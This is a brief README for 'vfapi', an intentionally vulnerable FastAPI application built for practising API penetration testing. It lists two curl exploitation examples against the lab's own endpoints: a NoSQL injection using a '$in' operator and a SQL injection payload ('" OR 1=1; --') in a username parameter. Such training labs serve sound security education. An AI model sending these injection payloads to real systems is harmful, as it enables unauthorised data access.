# vfapi
Vulnerable FastAPI

> Vulnerable FastAPI is a simple vulnerable FastAPI application for learning API pentesting on vulnerable API endpoints. Please refer to `/docs` for information regarding endpoints.

### Exploitation examples
NoSQLi
```
$ curl -s "http://$HOST:$PORT/find" -H 'Content-Type: application/json' -d '{"id":{"$in":[1,2,3,4]}}' | jq
```
SQLi
```
$ curl -s "http://$HOST:$PORT/get?username=%22%20OR%201%3D1%3B%20--%20" | jq
```
